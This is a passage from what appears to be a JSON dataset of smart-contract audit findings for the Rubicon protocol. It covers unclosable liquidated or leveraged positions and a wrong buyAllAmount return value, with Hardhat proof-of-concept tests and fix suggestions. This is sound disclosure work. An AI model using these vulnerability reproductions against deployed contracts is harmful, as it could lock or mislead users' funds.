        "poc": "## Proof of concept\n\nWe will use `test/hardhat-tests/leverage-wrapper.ts` for the POC.\n- Firstly, we want more data returned from the fixture. Modify the following lines from the fixture as follow:\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/test/hardhat-tests/leverage-wrapper.ts#L194-L203\n\n```typescript\nreturn {\n  rubiconMarket,\n  testCoin,\n  cToken,\n  owner,\n  otherAccount,\n  testStableCoin,\n  cTokenStable,\n  Position,\n  priceOracle, // add this\n  comptroller, // add this\n};\n```\n\n- Then, paste the following test:\n\n```typescript\ndescribe(\"Liquidated position bug\", function () {\n  it(\"POC\", async function () {\n    const { owner, testCoin, testStableCoin, cToken, cTokenStable, Position, otherAccount, priceOracle, comptroller } = await loadFixture(\n      deployPoolsUtilityFixture\n    ); // I really went all out on this didn't I?\n\n    // assert that, initially, the Position contract holds no cTokens\n    expect(await cToken.balanceOf(Position.address)).to.be.eq(0);\n\n    // let's first open a long position with 2x margin\n    await Position.connect(owner).buyAllAmountWithLeverage(\n      testCoin.address,\n      testStableCoin.address,\n      TEST_AMOUNT,\n      x2_332\n    );\n\n    // now drop the price to half\n    await priceOracle.addCtoken(cToken.address, parseUnits(\"0.5\", 18));\n\n    // caveat: gotta set the close factor and liq incentive first\n    await comptroller.connect(owner)._setCloseFactor(parseUnits(\"0.5\"));\n    await comptroller.connect(owner)._setLiquidationIncentive(parseUnits(\"0.1\"));\n\n    // now fund otherAccount with some testStableCoin, and liquidate\n    await testStableCoin.connect(otherAccount).faucet();\n    await testStableCoin.connect(otherAccount).approve(cTokenStable.address, parseUnits(\"100000\")); // excess approval is fine\n    await cTokenStable.connect(otherAccount).liquidateBorrow(Position.address, parseUnits(\"12\", 6), cToken.address); // liquidated!\n\n    // now attempt to close the position, but fail\n    await expect(Position.connect(owner).closePosition(1)).to.be.reverted;\n\n    // however, the position contract still have cToken, but also positive debt\n    expect(await cToken.balanceOf(Position.address)).to.be.gt(0);\n    expect(await cTokenStable.borrowBalanceStored(Position.address)).to.be.gt(0);\n  });\n});\n```\n",
        "fix_status": null,
        "other": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L210-L223\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L382-L397\n\n**container:**\n# Vulnerability details\n## Vulnerability details\n\nThe Compound V2 protocol is a lending protocol that allows users to supply collaterals in order to borrow other assets (possibly the collateral itself). If a user's position gets undercollateralized, the user will get liquidated (i.e. a liquidator can seize some of their collateral, while repaying also part of their debt.)\n\nThe problem is that, if a user's created margin position gets liquidated, it is not possible to close said position, at least not without disrupting other positions alongside that.\n\nThis is because the function `closePosition()` will attempt to close the position *using the full amount* it has been provided when opening. In other words, the contract never got the info if any liquidations happened, and will attempt to explicitly undo the position in addition to closing it.\n\n**tools_used:**\n## Tools used\n\nManual review + Hardhat for POC/testing\n"
      },
      "markdown_body": "https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L210-L223\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L382-L397\n\n\n# Vulnerability details\n\n## Vulnerability details\n\nThe Compound V2 protocol is a lending protocol that allows users to supply collaterals in order to borrow other assets (possibly the collateral itself). If a user's position gets undercollateralized, the user will get liquidated (i.e. a liquidator can seize some of their collateral, while repaying also part of their debt.)\n\nThe problem is that, if a user's created margin position gets liquidated, it is not possible to close said position, at least not without disrupting other positions alongside that.\n\nThis is because the function `closePosition()` will attempt to close the position *using the full amount* it has been provided when opening. In other words, the contract never got the info if any liquidations happened, and will attempt to explicitly undo the position in addition to closing it.\n\n## Proof of concept\n\nWe will use `test/hardhat-tests/leverage-wrapper.ts` for the POC.\n- Firstly, we want more data returned from the fixture. Modify the following lines from the fixture as follow:\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/test/hardhat-tests/leverage-wrapper.ts#L194-L203\n\n```typescript\nreturn {\n  rubiconMarket,\n  testCoin,\n  cToken,\n  owner,\n  otherAccount,\n  testStableCoin,\n  cTokenStable,\n  Position,\n  priceOracle, // add this\n  comptroller, // add this\n};\n```\n\n- Then, paste the following test:\n\n```typescript\ndescribe(\"Liquidated position bug\", function () {\n  it(\"POC\", async function () {\n    const { owner, testCoin, testStableCoin, cToken, cTokenStable, Position, otherAccount, priceOracle, comptroller } = await loadFixture(\n      deployPoolsUtilityFixture\n    ); // I really went all out on this didn't I?\n\n    // assert that, initially, the Position contract holds no cTokens\n    expect(await cToken.balanceOf(Position.address)).to.be.eq(0);\n\n    // let's first open a long position with 2x margin\n    await Position.connect(owner).buyAllAmountWithLeverage(\n      testCoin.address,\n      testStableCoin.address,\n      TEST_AMOUNT,\n      x2_332\n    );\n\n    // now drop the price to half\n    await priceOracle.addCtoken(cToken.address, parseUnits(\"0.5\", 18));\n\n    // caveat: gotta set the close factor and liq incentive first\n    await comptroller.connect(owner)._setCloseFactor(parseUnits(\"0.5\"));\n    await comptroller.connect(owner)._setLiquidationIncentive(parseUnits(\"0.1\"));\n\n    // now fund otherAccount with some testStableCoin, and liquidate\n    await testStableCoin.connect(otherAccount).faucet();\n    await testStableCoin.connect(otherAccount).approve(cTokenStable.address, parseUnits(\"100000\")); // excess approval is fine\n    await cTokenStable.connect(otherAccount).liquidateBorrow(Position.address, parseUnits(\"12\", 6), cToken.address); // liquidated!\n\n    // now attempt to close the position, but fail\n    await expect(Position.connect(owner).closePosition(1)).to.be.reverted;\n\n    // however, the position contract still have cToken, but also positive debt\n    expect(await cToken.balanceOf(Position.address)).to.be.gt(0);\n    expect(await cTokenStable.borrowBalanceStored(Position.address)).to.be.gt(0);\n  });\n});\n```\n\n## Impact\n\nIt is worth noting that the funds *can* still be recovered. This is because Compound exposes a function `repayBehalf` allowing the user to repay on behalf of `Position`, and `Position` itself exposes a function `withdraw` allowing users to withdraw their CTokens directly and redeem.\n- However, this defeats the purpose of `Position` contract, when the users are forced to manage their margin positions *for the Position contract*, as opposed to the contract doing so for them.\n\nThe most serious impact here we believe is not the difficult recover of funds, but in affecting/misleading user decisions when managing their margin portfolio. During a liquidation, an asset is repaid to seize another asset. If two assets that are seized belongs to two *different* positions, a \"technically liquidated\" position can be withdraw, but leaving other positions at risk. In other words, the impossibility of closing a position will cause mismanagement, which is the opposite of what `Position` is trying to achieve.\n\n## Tools used\n\nManual review + Hardhat for POC/testing\n\n## Recommended mitigation\n\nThis is a very difficult problem to address due to its nature as a business logic problem. At the very least it is not possible to tell whether \"a position was liquidated\", due to the way cross-margin positionings work.\n\nWe suggest exposing the following extra functionalities to address the immediate problem:\n- A \"close position given margin\" function, quite literally the opposite counterpart of \"open position\" function: The user is able to supply an amount of borrow to repay, an amount of collateral to withdraw, and an initial margin. The function calculates the loopings needed to repay/withdraw the required amount, and possibly performs them.\n    - The point here is the ability to close positions that have not been opened. If a position gets liquidated, there is no way for the `Position` contract to tell and manage its own portfolio accordingly.\n- A function to close a position *without* un-looping the position. This allows users to freely close positions that they recognize are no longer applicable.\n",
      "metadata": {
        "Severity": "High",
        "Difficulty": null,
        "Type": "bug",
        "Finding ID": null,
        "Target": null
      }
    },
    {
      "index": 702,
      "page_start": null,
      "heading": "702. Cannot close leveraged positions",
      "heading_cleaned": "Cannot close leveraged positions",
      "markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L280-L302\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L210-L223\n\n\n# Vulnerability details\n\n## Impact\nOpening a leveraged position goes through some cycles of supplying collateral and borrowing. Since the leverage is larger than 1, the borrowed amount is usually larger than the liquid asset. So in most cases, you would need to repeat the loop backwards(repay, redeem, swap...). However `closePosition` tries to repay the whole borrowed amount at once, which would revert. As a result, the user would fail to close a position if he has no extra liquid assets.\n\n## Proof of Concept\n`closePosition` first repays the borrowed asset, then redeem the collateral and closes the position.\n```solidity\n/* Position.sol # closePosition */\n  _repay(asset, quote, posId);\n  _redeem(asset, bathTokenAmount);\n\n  _removePosition(posId);\n```\n\n`_repay` would always try to repay the whole borrowed quote tokens, so first it would sell the asset tokens for quote tokens. However, since this is a leveraged position, there won't be enough asset tokens to sell here.\n```solidity\n/* Position.sol # _repay */\n  address _bathTokenQuote = bathHouseV2.getBathTokenFromAsset(_quote);\n  uint256 _amountToRepay = borrowBalanceOfPos(_posId); // total borrowed quote tokens\n\n  // sell asset for quote\n  _rubiconSwap(_asset, _quote, _amountToRepay, false);\n  uint256 _quoteBalance = IERC20(_quote).balanceOf(address(this));\n```\n\nSo it would try to replenish the asset tokens from the owner, which would fail if there's not enough balance.\n```solidity\n/* Position.sol # _marketSell */\n  if (_assetBalance < _payAmount) {\n      IERC20(_asset).transferFrom(\n          msg.sender,\n          address(this),\n          _payAmount.sub(_assetBalance).add(_fee)\n      );\n  }\n```\n\nThe below test shows that the position closing would revert if there's not enough assets.\n```javascript\n  it.only(\"Cannot close position\", async function () {\n    const { owner, testCoin, testStableCoin, Position, rubiconMarket } =\n      await loadFixture(deployPoolsUtilityFixture);\n\n    await Position.connect(owner).buyAllAmountWithLeverage(\n      testCoin.address,\n      testStableCoin.address,\n      TEST_AMOUNT,\n      parseUnits(\"2.97\")\n    );\n\n    /* Revoke: as if there were no assets */\n    await testCoin.connect(owner).approve(Position.address, parseUnits(\"0\"));\n    /* Cannot close position without enough assets */\n    await expect(Position.connect(owner).closePosition(1)).to.be.reverted;\n  });\n```\n\n## Tools Used\n\nHardhat\n\n## Recommended Mitigation Steps\n\nAdd a repay loop (repay - redeem - swap...), or enable partially closing positions\n",
      "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L280-L302\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L210-L223\n\n\n# Vulnerability details\n\n## Impact\nOpening a leveraged position goes through some cycles of supplying collateral and borrowing. Since the leverage is larger than 1, the borrowed amount is usually larger than the liquid asset. So in most cases, you would need to repeat the loop backwards(repay, redeem, swap...). However `closePosition` tries to repay the whole borrowed amount at once, which would revert. As a result, the user would fail to close a position if he has no extra liquid assets.\n\n## Proof of Concept\n`closePosition` first repays the borrowed asset, then redeem the collateral and closes the position.\n```solidity\n/* Position.sol # closePosition */\n  _repay(asset, quote, posId);\n  _redeem(asset, bathTokenAmount);\n\n  _removePosition(posId);\n```\n\n`_repay` would always try to repay the whole borrowed quote tokens, so first it would sell the asset tokens for quote tokens. However, since this is a leveraged position, there won't be enough asset tokens to sell here.\n```solidity\n/* Position.sol # _repay */\n  address _bathTokenQuote = bathHouseV2.getBathTokenFromAsset(_quote);\n  uint256 _amountToRepay = borrowBalanceOfPos(_posId); // total borrowed quote tokens\n\n  // sell asset for quote\n  _rubiconSwap(_asset, _quote, _amountToRepay, false);\n  uint256 _quoteBalance = IERC20(_quote).balanceOf(address(this));\n```\n\nSo it would try to replenish the asset tokens from the owner, which would fail if there's not enough balance.\n```solidity\n/* Position.sol # _marketSell */\n  if (_assetBalance < _payAmount) {\n      IERC20(_asset).transferFrom(\n          msg.sender,\n          address(this),\n          _payAmount.sub(_assetBalance).add(_fee)\n      );\n  }\n```\n\nThe below test shows that the position closing would revert if there's not enough assets.\n```javascript\n  it.only(\"Cannot close position\", async function () {\n    const { owner, testCoin, testStableCoin, Position, rubiconMarket } =\n      await loadFixture(deployPoolsUtilityFixture);\n\n    await Position.connect(owner).buyAllAmountWithLeverage(\n      testCoin.address,\n      testStableCoin.address,\n      TEST_AMOUNT,\n      parseUnits(\"2.97\")\n    );\n\n    /* Revoke: as if there were no assets */\n    await testCoin.connect(owner).approve(Position.address, parseUnits(\"0\"));\n    /* Cannot close position without enough assets */\n    await expect(Position.connect(owner).closePosition(1)).to.be.reverted;\n  });\n```\n\n## Tools Used\n\nHardhat\n\n## Recommended Mitigation Steps\n\nAdd a repay loop (repay - redeem - swap...), or enable partially closing positions",
      "description": null,
      "impact": "## Impact\nOpening a leveraged position goes through some cycles of supplying collateral and borrowing. Since the leverage is larger than 1, the borrowed amount is usually larger than the liquid asset. So in most cases, you would need to repeat the loop backwards(repay, redeem, swap...). However `closePosition` tries to repay the whole borrowed amount at once, which would revert. As a result, the user would fail to close a position if he has no extra liquid assets.\n",
      "mitigation": "## Recommended Mitigation Steps\n\nAdd a repay loop (repay - redeem - swap...), or enable partially closing positions\n",
      "poc": "## Proof of Concept\n`closePosition` first repays the borrowed asset, then redeem the collateral and closes the position.\n```solidity\n/* Position.sol # closePosition */\n  _repay(asset, quote, posId);\n  _redeem(asset, bathTokenAmount);\n\n  _removePosition(posId);\n```\n\n`_repay` would always try to repay the whole borrowed quote tokens, so first it would sell the asset tokens for quote tokens. However, since this is a leveraged position, there won't be enough asset tokens to sell here.\n```solidity\n/* Position.sol # _repay */\n  address _bathTokenQuote = bathHouseV2.getBathTokenFromAsset(_quote);\n  uint256 _amountToRepay = borrowBalanceOfPos(_posId); // total borrowed quote tokens\n\n  // sell asset for quote\n  _rubiconSwap(_asset, _quote, _amountToRepay, false);\n  uint256 _quoteBalance = IERC20(_quote).balanceOf(address(this));\n```\n\nSo it would try to replenish the asset tokens from the owner, which would fail if there's not enough balance.\n```solidity\n/* Position.sol # _marketSell */\n  if (_assetBalance < _payAmount) {\n      IERC20(_asset).transferFrom(\n          msg.sender,\n          address(this),\n          _payAmount.sub(_assetBalance).add(_fee)\n      );\n  }\n```\n\nThe below test shows that the position closing would revert if there's not enough assets.\n```javascript\n  it.only(\"Cannot close position\", async function () {\n    const { owner, testCoin, testStableCoin, Position, rubiconMarket } =\n      await loadFixture(deployPoolsUtilityFixture);\n\n    await Position.connect(owner).buyAllAmountWithLeverage(\n      testCoin.address,\n      testStableCoin.address,\n      TEST_AMOUNT,\n      parseUnits(\"2.97\")\n    );\n\n    /* Revoke: as if there were no assets */\n    await testCoin.connect(owner).approve(Position.address, parseUnits(\"0\"));\n    /* Cannot close position without enough assets */\n    await expect(Position.connect(owner).closePosition(1)).to.be.reverted;\n  });\n```\n",
      "other": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L280-L302\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L210-L223\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools Used\n\nHardhat\n",
      "sections": {
        "description": null,
        "impact": "## Impact\nOpening a leveraged position goes through some cycles of supplying collateral and borrowing. Since the leverage is larger than 1, the borrowed amount is usually larger than the liquid asset. So in most cases, you would need to repeat the loop backwards(repay, redeem, swap...). However `closePosition` tries to repay the whole borrowed amount at once, which would revert. As a result, the user would fail to close a position if he has no extra liquid assets.\n",
        "recommendation": "## Recommended Mitigation Steps\n\nAdd a repay loop (repay - redeem - swap...), or enable partially closing positions\n",
        "poc": "## Proof of Concept\n`closePosition` first repays the borrowed asset, then redeem the collateral and closes the position.\n```solidity\n/* Position.sol # closePosition */\n  _repay(asset, quote, posId);\n  _redeem(asset, bathTokenAmount);\n\n  _removePosition(posId);\n```\n\n`_repay` would always try to repay the whole borrowed quote tokens, so first it would sell the asset tokens for quote tokens. However, since this is a leveraged position, there won't be enough asset tokens to sell here.\n```solidity\n/* Position.sol # _repay */\n  address _bathTokenQuote = bathHouseV2.getBathTokenFromAsset(_quote);\n  uint256 _amountToRepay = borrowBalanceOfPos(_posId); // total borrowed quote tokens\n\n  // sell asset for quote\n  _rubiconSwap(_asset, _quote, _amountToRepay, false);\n  uint256 _quoteBalance = IERC20(_quote).balanceOf(address(this));\n```\n\nSo it would try to replenish the asset tokens from the owner, which would fail if there's not enough balance.\n```solidity\n/* Position.sol # _marketSell */\n  if (_assetBalance < _payAmount) {\n      IERC20(_asset).transferFrom(\n          msg.sender,\n          address(this),\n          _payAmount.sub(_assetBalance).add(_fee)\n      );\n  }\n```\n\nThe below test shows that the position closing would revert if there's not enough assets.\n```javascript\n  it.only(\"Cannot close position\", async function () {\n    const { owner, testCoin, testStableCoin, Position, rubiconMarket } =\n      await loadFixture(deployPoolsUtilityFixture);\n\n    await Position.connect(owner).buyAllAmountWithLeverage(\n      testCoin.address,\n      testStableCoin.address,\n      TEST_AMOUNT,\n      parseUnits(\"2.97\")\n    );\n\n    /* Revoke: as if there were no assets */\n    await testCoin.connect(owner).approve(Position.address, parseUnits(\"0\"));\n    /* Cannot close position without enough assets */\n    await expect(Position.connect(owner).closePosition(1)).to.be.reverted;\n  });\n```\n",
        "fix_status": null,
        "other": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L280-L302\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L210-L223\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools Used\n\nHardhat\n"
      },
      "markdown_body": "https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L280-L302\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L210-L223\n\n\n# Vulnerability details\n\n## Impact\nOpening a leveraged position goes through some cycles of supplying collateral and borrowing. Since the leverage is larger than 1, the borrowed amount is usually larger than the liquid asset. So in most cases, you would need to repeat the loop backwards(repay, redeem, swap...). However `closePosition` tries to repay the whole borrowed amount at once, which would revert. As a result, the user would fail to close a position if he has no extra liquid assets.\n\n## Proof of Concept\n`closePosition` first repays the borrowed asset, then redeem the collateral and closes the position.\n```solidity\n/* Position.sol # closePosition */\n  _repay(asset, quote, posId);\n  _redeem(asset, bathTokenAmount);\n\n  _removePosition(posId);\n```\n\n`_repay` would always try to repay the whole borrowed quote tokens, so first it would sell the asset tokens for quote tokens. However, since this is a leveraged position, there won't be enough asset tokens to sell here.\n```solidity\n/* Position.sol # _repay */\n  address _bathTokenQuote = bathHouseV2.getBathTokenFromAsset(_quote);\n  uint256 _amountToRepay = borrowBalanceOfPos(_posId); // total borrowed quote tokens\n\n  // sell asset for quote\n  _rubiconSwap(_asset, _quote, _amountToRepay, false);\n  uint256 _quoteBalance = IERC20(_quote).balanceOf(address(this));\n```\n\nSo it would try to replenish the asset tokens from the owner, which would fail if there's not enough balance.\n```solidity\n/* Position.sol # _marketSell */\n  if (_assetBalance < _payAmount) {\n      IERC20(_asset).transferFrom(\n          msg.sender,\n          address(this),\n          _payAmount.sub(_assetBalance).add(_fee)\n      );\n  }\n```\n\nThe below test shows that the position closing would revert if there's not enough assets.\n```javascript\n  it.only(\"Cannot close position\", async function () {\n    const { owner, testCoin, testStableCoin, Position, rubiconMarket } =\n      await loadFixture(deployPoolsUtilityFixture);\n\n    await Position.connect(owner).buyAllAmountWithLeverage(\n      testCoin.address,\n      testStableCoin.address,\n      TEST_AMOUNT,\n      parseUnits(\"2.97\")\n    );\n\n    /* Revoke: as if there were no assets */\n    await testCoin.connect(owner).approve(Position.address, parseUnits(\"0\"));\n    /* Cannot close position without enough assets */\n    await expect(Position.connect(owner).closePosition(1)).to.be.reverted;\n  });\n```\n\n## Tools Used\n\nHardhat\n\n## Recommended Mitigation Steps\n\nAdd a repay loop (repay - redeem - swap...), or enable partially closing positions\n",
      "metadata": {
        "Severity": "High",
        "Difficulty": null,
        "Type": "bug",
        "Finding ID": null,
        "Target": null
      }
    },
    {
      "index": 714,
      "page_start": null,
      "heading": "714. The return value of buyAllAmount is incorrect",
      "heading_cleaned": "The return value of buyAllAmount is incorrect",
      "markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L1064-L1107\n\n\n# Vulnerability details\n\n## Impact\nbuyAllAmount will return the amount of tokens spent on the exchange, but the actual return value is less than the actual amount of tokens spent.\n\nConsider WBTC price is 10000 USDC and the total fee is 10%.\nThe user calls buyAllAmount to buy 1 WBTC, and the calculated fill_amt is 10,000 USDC.\n```solidity\n    function buyAllAmount(\n        ERC20 buy_gem,\n        uint256 buy_amt,\n        ERC20 pay_gem,\n        uint256 max_fill_amount\n    ) external returns (uint256 fill_amt) {\n        require(!locked);\n        uint256 offerId;\n        while (buy_amt > 0) {\n            //Meanwhile there is amount to buy\n            offerId = getBestOffer(buy_gem, pay_gem); //Get the best offer for the token pair\n            require(offerId != 0, \"offerId == 0\");\n\n            // There is a chance that buy_amt is smaller than 1 wei of the other token\n            if (\n                mul(buy_amt, 1 ether) <\n                wdiv(offers[offerId].pay_amt, offers[offerId].buy_amt)\n            ) {\n                break; //We consider that all amount is sold\n            }\n            if (buy_amt >= offers[offerId].pay_amt) {\n                //If amount to buy is higher or equal than current offer amount to sell\n                fill_amt = add(fill_amt, offers[offerId].buy_amt); //Add amount sold to acumulator\n                buy_amt = sub(buy_amt, offers[offerId].pay_amt); //Decrease amount to buy\n                take(bytes32(offerId), uint128(offers[offerId].pay_amt)); //We take the whole offer\n            } else {\n                //if lower\n                fill_amt = add(\n                    fill_amt,\n                    rmul(\n                        mul(buy_amt, 10 ** 9),\n                        rdiv(offers[offerId].buy_amt, offers[offerId].pay_amt)\n                    ) / 10 ** 9\n                ); //Add amount sold to acumulator\n                take(bytes32(offerId), uint128(buy_amt)); //We take the portion of the offer that we need\n                buy_amt = 0; //All amount is bought\n            }\n```\nIn the buy function, the 1 WBTC to be purchased minus the fee is 0.9 WBTC, that is, the user actually spends 10,000 USDC to buy 0.9 WBTC, and the fill_amt finally returned is 10000 USDC minus the fee is 9000 USDC, but the user actually spends 10000 USDC, which causes the return value of buyAllAmount to be incorrect\n```solidity\n        require(\n            fill_amt <= max_fill_amount,\n            \"fill_amt exceeds max_fill_amount\"\n        );\n        fill_amt = calcAmountAfterFee(fill_amt);\n    }\n```\n\n## Proof of Concept\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L1064-L1107\n## Tools Used\nNone\n## Recommended Mitigation Steps\nChange to\n```diff\n        require(\n            fill_amt <= max_fill_amount,\n            \"fill_amt exceeds max_fill_amount\"\n        );\n-       fill_amt = calcAmountAfterFee(fill_amt);\n    }\n```\n",
      "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L1064-L1107\n\n\n# Vulnerability details\n\n## Impact\nbuyAllAmount will return the amount of tokens spent on the exchange, but the actual return value is less than the actual amount of tokens spent.\n\nConsider WBTC price is 10000 USDC and the total fee is 10%.\nThe user calls buyAllAmount to buy 1 WBTC, and the calculated fill_amt is 10,000 USDC. \n```solidity\n    function buyAllAmount(\n        ERC20 buy_gem,\n        uint256 buy_amt,\n        ERC20 pay_gem,\n        uint256 max_fill_amount\n    ) external returns (uint256 fill_amt) {\n        require(!locked);\n        uint256 offerId;\n        while (buy_amt > 0) {\n            //Meanwhile there is amount to buy\n            offerId = getBestOffer(buy_gem, pay_gem); //Get the best offer for the token pair\n            require(offerId != 0, \"offerId == 0\");\n\n            // There is a chance that buy_amt is smaller than 1 wei of the other token\n            if (\n                mul(buy_amt, 1 ether) <\n                wdiv(offers[offerId].pay_amt, offers[offerId].buy_amt)\n            ) {\n                break; //We consider that all amount is sold\n            }\n            if (buy_amt >= offers[offerId].pay_amt) {\n                //If amount to buy is higher or equal than current offer amount to sell\n                fill_amt = add(fill_amt, offers[offerId].buy_amt); //Add amount sold to acumulator\n                buy_amt = sub(buy_amt, offers[offerId].pay_amt); //Decrease amount to buy\n                take(bytes32(offerId), uint128(offers[offerId].pay_amt)); //We take the whole offer\n            } else {\n                //if lower\n                fill_amt = add(\n                    fill_amt,\n                    rmul(\n                        mul(buy_amt, 10 ** 9),\n                        rdiv(offers[offerId].buy_amt, offers[offerId].pay_amt)\n                    ) / 10 ** 9\n                ); //Add amount sold to acumulator\n                take(bytes32(offerId), uint128(buy_amt)); //We take the portion of the offer that we need\n                buy_amt = 0; //All amount is bought\n            }\n```\nIn the buy function, the 1 WBTC to be purchased minus the fee is 0.9 WBTC, that is, the user actually spends 10,000 USDC to buy 0.9 WBTC, and the fill_amt finally returned is 10000 USDC minus the fee is 9000 USDC, but the user actually spends 10000 USDC, which causes the return value of buyAllAmount to be incorrect\n```solidity\n        require(\n            fill_amt <= max_fill_amount,\n            \"fill_amt exceeds max_fill_amount\"\n        );\n        fill_amt = calcAmountAfterFee(fill_amt);\n    }\n```\n\n## Proof of Concept\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L1064-L1107\n## Tools Used\nNone\n## Recommended Mitigation Steps\nChange to\n```diff\n        require(\n            fill_amt <= max_fill_amount,\n            \"fill_amt exceeds max_fill_amount\"\n        );\n-       fill_amt = calcAmountAfterFee(fill_amt);\n    }\n```",
      "description": null,
      "impact": "## Impact\nbuyAllAmount will return the amount of tokens spent on the exchange, but the actual return value is less than the actual amount of tokens spent.\n\nConsider WBTC price is 10000 USDC and the total fee is 10%.\nThe user calls buyAllAmount to buy 1 WBTC, and the calculated fill_amt is 10,000 USDC.\n```solidity\n    function buyAllAmount(\n        ERC20 buy_gem,\n        uint256 buy_amt,\n        ERC20 pay_gem,\n        uint256 max_fill_amount\n    ) external returns (uint256 fill_amt) {\n        require(!locked);\n        uint256 offerId;\n        while (buy_amt > 0) {\n            //Meanwhile there is amount to buy\n            offerId = getBestOffer(buy_gem, pay_gem); //Get the best offer for the token pair\n            require(offerId != 0, \"offerId == 0\");\n\n            // There is a chance that buy_amt is smaller than 1 wei of the other token\n            if (\n                mul(buy_amt, 1 ether) <\n                wdiv(offers[offerId].pay_amt, offers[offerId].buy_amt)\n            ) {\n                break; //We consider that all amount is sold\n            }\n            if (buy_amt >= offers[offerId].pay_amt) {\n                //If amount to buy is higher or equal than current offer amount to sell\n                fill_amt = add(fill_amt, offers[offerId].buy_amt); //Add amount sold to acumulator\n                buy_amt = sub(buy_amt, offers[offerId].pay_amt); //Decrease amount to buy\n                take(bytes32(offerId), uint128(offers[offerId].pay_amt)); //We take the whole offer\n            } else {\n                //if lower\n                fill_amt = add(\n                    fill_amt,\n                    rmul(\n                        mul(buy_amt, 10 ** 9),\n                        rdiv(offers[offerId].buy_amt, offers[offerId].pay_amt)\n                    ) / 10 ** 9\n                ); //Add amount sold to acumulator\n                take(bytes32(offerId), uint128(buy_amt)); //We take the portion of the offer that we need\n                buy_amt = 0; //All amount is bought\n            }\n```\nIn the buy function, the 1 WBTC to be purchased minus the fee is 0.9 WBTC, that is, the user actually spends 10,000 USDC to buy 0.9 WBTC, and the fill_amt finally returned is 10000 USDC minus the fee is 9000 USDC, but the user actually spends 10000 USDC, which causes the return value of buyAllAmount to be incorrect\n```solidity\n        require(\n            fill_amt <= max_fill_amount,\n            \"fill_amt exceeds max_fill_amount\"\n        );\n        fill_amt = calcAmountAfterFee(fill_amt);\n    }\n```\n",
      "mitigation": "## Recommended Mitigation Steps\nChange to\n```diff\n        require(\n            fill_amt <= max_fill_amount,\n            \"fill_amt exceeds max_fill_amount\"\n        );\n-       fill_amt = calcAmountAfterFee(fill_amt);\n    }\n```\n",
      "poc": "## Proof of Concept\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L1064-L1107\n",
      "other": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L1064-L1107\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools Used\nNone\n",
      "sections": {
        "description": null,
        "impact": "## Impact\nbuyAllAmount will return the amount of tokens spent on the exchange, but the actual return value is less than the actual amount of tokens spent.\n\nConsider WBTC price is 10000 USDC and the total fee is 10%.\nThe user calls buyAllAmount to buy 1 WBTC, and the calculated fill_amt is 10,000 USDC.\n```solidity\n    function buyAllAmount(\n        ERC20 buy_gem,\n        uint256 buy_amt,\n        ERC20 pay_gem,\n        uint256 max_fill_amount\n    ) external returns (uint256 fill_amt) {\n        require(!locked);\n        uint256 offerId;\n        while (buy_amt > 0) {\n            //Meanwhile there is amount to buy\n            offerId = getBestOffer(buy_gem, pay_gem); //Get the best offer for the token pair\n            require(offerId != 0, \"offerId == 0\");\n\n            // There is a chance that buy_amt is smaller than 1 wei of the other token\n            if (\n                mul(buy_amt, 1 ether) <\n                wdiv(offers[offerId].pay_amt, offers[offerId].buy_amt)\n            ) {\n                break; //We consider that all amount is sold\n            }\n            if (buy_amt >= offers[offerId].pay_amt) {\n                //If amount to buy is higher or equal than current offer amount to sell\n                fill_amt = add(fill_amt, offers[offerId].buy_amt); //Add amount sold to acumulator\n                buy_amt = sub(buy_amt, offers[offerId].pay_amt); //Decrease amount to buy\n                take(bytes32(offerId), uint128(offers[offerId].pay_amt)); //We take the whole offer\n            } else {\n                //if lower\n                fill_amt = add(\n                    fill_amt,\n                    rmul(\n                        mul(buy_amt, 10 ** 9),\n                        rdiv(offers[offerId].buy_amt, offers[offerId].pay_amt)\n                    ) / 10 ** 9\n                ); //Add amount sold to acumulator\n                take(bytes32(offerId), uint128(buy_amt)); //We take the portion of the offer that we need\n                buy_amt = 0; //All amount is bought\n            }\n```\nIn the buy function, the 1 WBTC to be purchased minus the fee is 0.9 WBTC, that is, the user actually spends 10,000 USDC to buy 0.9 WBTC, and 